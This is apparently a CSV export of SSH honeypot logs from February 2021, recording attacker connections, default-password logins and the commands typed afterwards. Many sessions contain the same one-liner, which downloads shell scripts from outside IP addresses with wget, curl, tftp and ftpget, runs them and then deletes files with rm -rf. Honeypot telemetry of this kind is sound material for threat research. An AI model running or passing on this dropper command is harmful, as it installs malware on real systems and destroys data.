eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.closed,2021-02-12 17:23:27.400103+00:00,188.166.87.163,,a15094681473,61.988402128219604,Connection lost after 61 seconds
cowrie.login.success,2021-02-12 17:23:27.654069+00:00,188.166.87.163,,c71cc8c26021,,login attempt [server/server] succeeded
cowrie.login.success,2021-02-12 17:23:27.764468+00:00,188.166.87.163,,d3fbf86aaadc,,login attempt [root/password] succeeded
cowrie.login.success,2021-02-12 17:23:27.766610+00:00,188.166.87.163,,c16ad60c9f85,,login attempt [admin/admin] succeeded
cowrie.login.success,2021-02-12 17:23:27.768575+00:00,188.166.87.163,,31f0d09e5673,,login attempt [system/system] succeeded
cowrie.login.success,2021-02-12 17:23:27.770625+00:00,188.166.87.163,,f83332da4639,,login attempt [zabbix/zabbix] succeeded
cowrie.login.success,2021-02-12 17:23:27.772799+00:00,188.166.87.163,,e7f188b23084,,login attempt [root/toor] succeeded
cowrie.login.success,2021-02-12 17:23:27.775667+00:00,188.166.87.163,,d18a9afee8da,,login attempt [mc/mc] succeeded
cowrie.session.params,2021-02-12 17:23:28.051687+00:00,188.166.87.163,,c71cc8c26021,,[]
cowrie.command.input,2021-02-12 17:23:28.052573+00:00,188.166.87.163,,c71cc8c26021,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:28.166928+00:00,188.166.87.163,,d3fbf86aaadc,,[]
cowrie.command.input,2021-02-12 17:23:28.167795+00:00,188.166.87.163,,d3fbf86aaadc,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:28.595385+00:00,188.166.87.163,,c16ad60c9f85,,[]
cowrie.command.input,2021-02-12 17:23:28.597118+00:00,188.166.87.163,,c16ad60c9f85,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:28.640171+00:00,188.166.87.163,,e7f188b23084,,[]
cowrie.command.input,2021-02-12 17:23:28.641148+00:00,188.166.87.163,,e7f188b23084,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:28.680631+00:00,188.166.87.163,,f83332da4639,,[]
cowrie.command.input,2021-02-12 17:23:28.681517+00:00,188.166.87.163,,f83332da4639,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:29.111719+00:00,188.166.87.163,,31f0d09e5673,,[]
cowrie.command.input,2021-02-12 17:23:29.112646+00:00,188.166.87.163,,31f0d09e5673,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:23:29.166782+00:00,188.166.87.163,,d18a9afee8da,,[]
cowrie.command.input,2021-02-12 17:23:29.167651+00:00,188.166.87.163,,d18a9afee8da,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.connect,2021-02-12 17:23:33.253643+00:00,188.166.87.163,155.232.195.82,1cb6a4534450,,New connection: 188.166.87.163:41890 (155.232.195.82:2222) [session: 1cb6a4534450]
cowrie.client.version,2021-02-12 17:23:33.254951+00:00,188.166.87.163,,1cb6a4534450,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 17:23:33.438432+00:00,188.166.87.163,,1cb6a4534450,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 17:23:34.189326+00:00,188.166.87.163,,1cb6a4534450,,login attempt [root/redhat] succeeded
cowrie.session.params,2021-02-12 17:23:34.594031+00:00,188.166.87.163,,1cb6a4534450,,[]
cowrie.command.input,2021-02-12 17:23:34.594931+00:00,188.166.87.163,,1cb6a4534450,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download.failed,2021-02-12 17:23:39.004088+00:00,188.166.87.163,,e7f188b23084,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:23:39.006167+00:00,188.166.87.163,,f83332da4639,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:23:39.007774+00:00,188.166.87.163,,d18a9afee8da,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:23:39.009479+00:00,188.166.87.163,,31f0d09e5673,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:23:39.011133+00:00,188.166.87.163,,c16ad60c9f85,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.connect,2021-02-12 17:23:41.899165+00:00,188.166.87.163,155.232.195.82,6ad582b4465c,,New connection: 188.166.87.163:48460 (155.232.195.82:2222) [session: 6ad582b4465c]
cowrie.client.version,2021-02-12 17:23:41.900336+00:00,188.166.87.163,,6ad582b4465c,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.file_download.failed,2021-02-12 17:23:42.076707+00:00,188.166.87.163,,e7f188b23084,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:24:37.728639+00:00,188.166.87.163,,e7f188b23084,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 17:24:37.740110+00:00,188.166.87.163,,c71cc8c26021,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:24:37.742232+00:00,188.166.87.163,,d3fbf86aaadc,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:24:37.744208+00:00,188.166.87.163,,1cb6a4534450,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:24:37.745964+00:00,188.166.87.163,,f83332da4639,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:25:37.724454+00:00,188.166.87.163,,f83332da4639,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 17:25:37.728395+00:00,188.166.87.163,,d18a9afee8da,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:26:44.764732+00:00,188.166.87.163,,d18a9afee8da,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 17:26:44.768678+00:00,188.166.87.163,,31f0d09e5673,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:27:37.885274+00:00,188.166.87.163,,31f0d09e5673,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 17:27:37.889280+00:00,188.166.87.163,,c16ad60c9f85,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 17:28:30.845820+00:00,188.166.87.163,,c16ad60c9f85,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.closed,2021-02-12 17:28:30.852752+00:00,188.166.87.163,,e7f188b23084,304.1350607872009,Connection lost after 304 seconds
cowrie.client.kex,2021-02-12 17:28:30.853821+00:00,188.166.87.163,,6ad582b4465c,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.connect,2021-02-12 17:28:30.881701+00:00,188.166.87.163,155.232.195.82,666ce7d9215e,,New connection: 188.166.87.163:55028 (155.232.195.82:2222) [session: 666ce7d9215e]
cowrie.session.connect,2021-02-12 17:28:30.883119+00:00,188.166.87.163,155.232.195.82,da677547e211,,New connection: 188.166.87.163:33392 (155.232.195.82:2222) [session: da677547e211]
cowrie.session.connect,2021-02-12 17:28:30.886164+00:00,188.166.87.163,155.232.195.82,625f5ff13fa0,,New connection: 188.166.87.163:39930 (155.232.195.82:2222) [session: 625f5ff13fa0]
cowrie.session.closed,2021-02-12 17:28:30.887541+00:00,188.166.87.163,,c71cc8c26021,304.17429208755493,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.888548+00:00,188.166.87.163,,31f0d09e5673,304.1776304244995,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.889544+00:00,188.166.87.163,,f83332da4639,304.177405834198,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.890521+00:00,188.166.87.163,,d18a9afee8da,304.1761612892151,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.891507+00:00,188.166.87.163,,d3fbf86aaadc,304.1749212741852,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.892494+00:00,188.166.87.163,,1cb6a4534450,297.6376657485962,Connection lost after 297 seconds
cowrie.session.closed,2021-02-12 17:28:30.893471+00:00,188.166.87.163,,c16ad60c9f85,304.1780061721802,Connection lost after 304 seconds
cowrie.session.closed,2021-02-12 17:28:30.896793+00:00,188.166.87.163,,6ad582b4465c,288.99653816223145,Connection lost after 288 seconds
cowrie.client.version,2021-02-12 17:28:30.897542+00:00,188.166.87.163,,666ce7d9215e,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:28:30.898357+00:00,188.166.87.163,,da677547e211,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:28:30.899616+00:00,188.166.87.163,,625f5ff13fa0,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.closed,2021-02-12 17:28:30.900693+00:00,188.166.87.163,,666ce7d9215e,0.017837047576904002,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 17:28:30.901594+00:00,188.166.87.163,,da677547e211,0.015671491622924,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 17:28:30.902936+00:00,188.166.87.163,,625f5ff13fa0,0.015837669372558,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 17:29:45.956400+00:00,157.230.163.6,155.232.195.83,adf663f3ee35,,New connection: 157.230.163.6:60000 (155.232.195.83:2222) [session: adf663f3ee35]
cowrie.session.closed,2021-02-12 17:29:47.486415+00:00,157.230.163.6,,adf663f3ee35,1.528411149978637,Connection lost after 1 seconds
cowrie.session.connect,2021-02-12 17:30:31.550429+00:00,157.230.163.6,155.232.195.82,b5a9fe42ea03,,New connection: 157.230.163.6:60000 (155.232.195.82:2222) [session: b5a9fe42ea03]
cowrie.session.closed,2021-02-12 17:30:32.757028+00:00,157.230.163.6,,b5a9fe42ea03,1.20494794845581,Connection lost after 1 seconds
cowrie.session.connect,2021-02-12 17:44:26.720752+00:00,221.181.185.198,155.232.195.83,6288edd1cafe,,New connection: 221.181.185.198:52029 (155.232.195.83:2222) [session: 6288edd1cafe]
cowrie.client.version,2021-02-12 17:44:26.721978+00:00,221.181.185.198,,6288edd1cafe,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 17:44:27.654708+00:00,221.181.185.198,,6288edd1cafe,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.connect,2021-02-12 17:44:27.691875+00:00,221.181.185.198,155.232.195.82,bad17645a407,,New connection: 221.181.185.198:39313 (155.232.195.82:2222) [session: bad17645a407]
cowrie.client.version,2021-02-12 17:44:27.693465+00:00,221.181.185.198,,bad17645a407,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 17:44:28.649792+00:00,221.181.185.198,,bad17645a407,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 17:44:31.909370+00:00,221.181.185.198,,6288edd1cafe,5.187497615814209,Connection lost after 5 seconds
cowrie.session.closed,2021-02-12 17:44:35.396976+00:00,221.181.185.198,,bad17645a407,7.703606128692627,Connection lost after 7 seconds
cowrie.session.connect,2021-02-12 17:53:56.141630+00:00,64.225.100.21,155.232.195.82,b695b6b32b49,,New connection: 64.225.100.21:34222 (155.232.195.82:2222) [session: b695b6b32b49]
cowrie.session.closed,2021-02-12 17:53:56.345699+00:00,64.225.100.21,,b695b6b32b49,0.202977657318115,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 17:53:58.892402+00:00,64.225.100.21,155.232.195.82,2a45fd4e4629,,New connection: 64.225.100.21:41764 (155.232.195.82:2222) [session: 2a45fd4e4629]
cowrie.client.version,2021-02-12 17:53:58.894069+00:00,64.225.100.21,,2a45fd4e4629,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 17:53:59.089592+00:00,64.225.100.21,,2a45fd4e4629,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 17:53:59.909253+00:00,64.225.100.21,,2a45fd4e4629,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 17:54:01.109472+00:00,64.225.100.21,,2a45fd4e4629,2.215511322021484,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 17:54:13.440787+00:00,64.225.100.21,155.232.195.82,65039bbcab3f,,New connection: 64.225.100.21:51198 (155.232.195.82:2222) [session: 65039bbcab3f]
cowrie.client.version,2021-02-12 17:54:13.442532+00:00,64.225.100.21,,65039bbcab3f,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 17:54:13.644455+00:00,64.225.100.21,,65039bbcab3f,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 17:54:14.474062+00:00,64.225.100.21,,65039bbcab3f,,login attempt [root/123456] failed
cowrie.session.closed,2021-02-12 17:54:15.679407+00:00,64.225.100.21,,65039bbcab3f,2.237015724182129,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 17:54:28.311283+00:00,64.225.100.21,155.232.195.82,9ec90d18fa8d,,New connection: 64.225.100.21:60660 (155.232.195.82:2222) [session: 9ec90d18fa8d]
cowrie.client.version,2021-02-12 17:54:28.314945+00:00,64.225.100.21,,9ec90d18fa8d,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 17:54:28.508159+00:00,64.225.100.21,,9ec90d18fa8d,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 17:54:29.307341+00:00,64.225.100.21,,9ec90d18fa8d,,login attempt [root/admin] succeeded
cowrie.session.params,2021-02-12 17:54:29.741987+00:00,64.225.100.21,,9ec90d18fa8d,,[]
cowrie.command.input,2021-02-12 17:54:29.742872+00:00,64.225.100.21,,9ec90d18fa8d,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 17:54:30.117906+00:00,64.225.100.21,,9ec90d18fa8d,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:54:30.490713+00:00,64.225.100.21,,9ec90d18fa8d,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:55:20.727136+00:00,64.225.100.21,,9ec90d18fa8d,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.connect,2021-02-12 17:55:20.730923+00:00,64.225.100.21,155.232.195.82,4feb1411beac,,New connection: 64.225.100.21:41906 (155.232.195.82:2222) [session: 4feb1411beac]
cowrie.session.connect,2021-02-12 17:55:20.732604+00:00,64.225.100.21,155.232.195.82,65a9d7d4f1f8,,New connection: 64.225.100.21:51340 (155.232.195.82:2222) [session: 65a9d7d4f1f8]
cowrie.session.connect,2021-02-12 17:55:20.734071+00:00,64.225.100.21,155.232.195.82,ebcf4b91b532,,New connection: 64.225.100.21:60874 (155.232.195.82:2222) [session: ebcf4b91b532]
cowrie.client.version,2021-02-12 17:55:20.735340+00:00,64.225.100.21,,4feb1411beac,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:55:20.736435+00:00,64.225.100.21,,65a9d7d4f1f8,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 17:55:20.737337+00:00,64.225.100.21,,ebcf4b91b532,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 17:55:20.931372+00:00,64.225.100.21,,4feb1411beac,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:55:20.938462+00:00,64.225.100.21,,65a9d7d4f1f8,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 17:55:20.945451+00:00,64.225.100.21,,ebcf4b91b532,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.closed,2021-02-12 17:55:21.056196+00:00,64.225.100.21,,9ec90d18fa8d,52.74336886405945,Connection lost after 52 seconds
cowrie.login.success,2021-02-12 17:55:21.705860+00:00,64.225.100.21,,4feb1411beac,,login attempt [root/test] succeeded
cowrie.login.success,2021-02-12 17:55:21.748912+00:00,64.225.100.21,,65a9d7d4f1f8,,login attempt [root/12345678] succeeded
cowrie.login.success,2021-02-12 17:55:21.776819+00:00,64.225.100.21,,ebcf4b91b532,,login attempt [root/123456789] succeeded
cowrie.session.params,2021-02-12 17:55:22.939604+00:00,64.225.100.21,,4feb1411beac,,[]
cowrie.command.input,2021-02-12 17:55:22.940480+00:00,64.225.100.21,,4feb1411beac,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:55:23.028977+00:00,64.225.100.21,,65a9d7d4f1f8,,[]
cowrie.command.input,2021-02-12 17:55:23.029827+00:00,64.225.100.21,,65a9d7d4f1f8,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 17:55:23.060863+00:00,64.225.100.21,,ebcf4b91b532,,[]
cowrie.command.input,2021-02-12 17:55:23.061714+00:00,64.225.100.21,,ebcf4b91b532,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 17:55:23.312241+00:00,64.225.100.21,,4feb1411beac,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:55:23.435346+00:00,64.225.100.21,,ebcf4b91b532,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:55:23.439531+00:00,64.225.100.21,,65a9d7d4f1f8,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download,2021-02-12 17:55:23.686527+00:00,64.225.100.21,,4feb1411beac,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:56:13.926537+00:00,64.225.100.21,,4feb1411beac,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.connect,2021-02-12 17:56:13.931945+00:00,64.225.100.21,155.232.195.82,d08bc54e25ab,,New connection: 64.225.100.21:42082 (155.232.195.82:2222) [session: d08bc54e25ab]
cowrie.session.connect,2021-02-12 17:56:13.933428+00:00,64.225.100.21,155.232.195.82,9becd2edfa56,,New connection: 64.225.100.21:51530 (155.232.195.82:2222) [session: 9becd2edfa56]
cowrie.session.connect,2021-02-12 17:56:13.934899+00:00,64.225.100.21,155.232.195.82,f79525b356de,,New connection: 64.225.100.21:32850 (155.232.195.82:2222) [session: f79525b356de]
cowrie.session.file_download,2021-02-12 17:56:13.936363+00:00,64.225.100.21,,ebcf4b91b532,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:57:04.164372+00:00,64.225.100.21,,ebcf4b91b532,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.file_download,2021-02-12 17:57:04.167594+00:00,64.225.100.21,,65a9d7d4f1f8,,Downloaded URL (http://45.130.138.67/sh) with SHA-256 e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3 to var/lib/cowrie/downloads/e715d46c4c19415d1f47f669e8cd248fa04cfffa7d593040d4e96e01e23b9de3
cowrie.session.file_download.failed,2021-02-12 17:57:54.407310+00:00,64.225.100.21,,65a9d7d4f1f8,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.connect,2021-02-12 17:57:54.410040+00:00,64.225.100.21,155.232.195.82,c1a8e543c8de,,New connection: 64.225.100.21:42234 (155.232.195.82:2222) [session: c1a8e543c8de]
cowrie.session.connect,2021-02-12 17:57:54.411341+00:00,64.225.100.21,155.232.195.82,831e09a89b9b,,New connection: 64.225.100.21:51678 (155.232.195.82:2222) [session: 831e09a89b9b]
cowrie.session.connect,2021-02-12 17:57:54.412588+00:00,64.225.100.21,155.232.195.82,5d0c34f593dd,,New connection: 64.225.100.21:32940 (155.232.195.82:2222) [session: 5d0c34f593dd]
cowrie.session.connect,2021-02-12 17:57:54.413819+00:00,64.225.100.21,155.232.195.82,2d15bc3b81bf,,New connection: 64.225.100.21:42424 (155.232.195.82:2222) [session: 2d15bc3b81bf]
cowrie.session.connect,2021-02-12 17:57:54.415068+00:00,64.225.100.21,155.232.195.82,0da36a409b16,,New connection: 64.225.100.21:51880 (155.232.195.82:2222) [session: 0da36a409b16]
cowrie.session.connect,2021-02-12 17:57:54.416343+00:00,64.225.100.21,155.232.195.82,35f230741a47,,New connection: 64.225.100.21:33062 (155.232.195.82:2222) [session: 35f230741a47]
